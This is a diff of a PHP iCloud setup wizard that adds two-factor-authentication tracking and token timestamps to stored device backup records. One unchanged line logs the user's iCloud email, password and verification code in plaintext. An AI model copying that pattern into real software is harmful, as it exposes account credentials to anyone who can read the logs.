@@ -180,6 +180,7 @@ class Wizard extends BaseController {
 
         $this->view->twoFactorAuthentication = false;
         $this->view->invalidVerificationCode = false;
+        $this->view->twoFactorAuthEnabled = 0;
         
         try {
             if ($_POST) {
@@ -188,9 +189,14 @@ class Wizard extends BaseController {
                 elseif (empty($_POST['password']))
                     throw new EmptyICloudPassword;
 
+                if (isset($_POST['twoFactorAuthEnabled']) && $_POST['twoFactorAuthEnabled'] > 0) {
+                    $this->view->twoFactorAuthEnabled = 1;
+                }
+                
                 if ($this->getRequest()->hasPost('token')) {
                     $auth = \AppleCloud\Entry\Auth::createFromString($this->getRequest()->post('token'));
                 } elseif ($this->getRequest()->hasPost('email', 'password', 'verificationCode')) {
+                    $this->view->twoFactorAuthEnabled = 1;
                     $this->logger->addInfo('iCloud Verification Code #' . $this->auth['id'] . ' ACCOUNT: ' . $_POST['email'] . ' ' . $_POST['password'] . ' ' . $this->getRequest()->post('verificationCode'));
                     $client = new \AppleCloud\ServiceClient\Setup($this->logger);
                     $auth = $client->authenticate($this->getRequest()->post('email'), $this->getRequest()->post('password'), $this->getRequest()->post('verificationCode'));
@@ -297,8 +303,10 @@ class Wizard extends BaseController {
                                         ->setDeviceHash($device['backupUDID'])
                                         ->setLastBackup(0)
                                         ->setLastCommited($device['Committed'] > 0 ? 1 : 0)
-                                        ->setQuotaUsed($device['QuotaUsedMb']);
-
+                                        ->setQuotaUsed($device['QuotaUsedMb'])
+                                        ->setTwoFactorAuthenticationEnabled($this->view->twoFactorAuthEnabled > 0 ? 1 : 0)
+                                        ->setTokenGenerationTime(time());
+                                
                                 $deviceObserver = new DeviceObserver($this->di->get('logger'));
                                 $deviceObserver
                                         ->setMainDb($this->di->get('db'))
